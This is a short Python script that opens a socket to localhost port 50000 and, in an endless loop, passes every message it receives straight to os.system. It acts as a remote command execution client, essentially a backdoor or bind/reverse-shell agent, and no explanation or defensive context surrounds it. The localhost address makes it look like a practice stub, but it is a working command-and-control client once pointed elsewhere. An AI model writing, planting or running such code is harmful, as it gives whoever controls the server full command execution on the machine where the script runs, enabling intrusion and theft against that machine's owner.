import socket
import threading
from os import system

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost', 50000))




def action():
    try:  
        message = client.recv(1024).decode('utf-8')
        system(message)

    except:
        pass
        

while True:
    action()
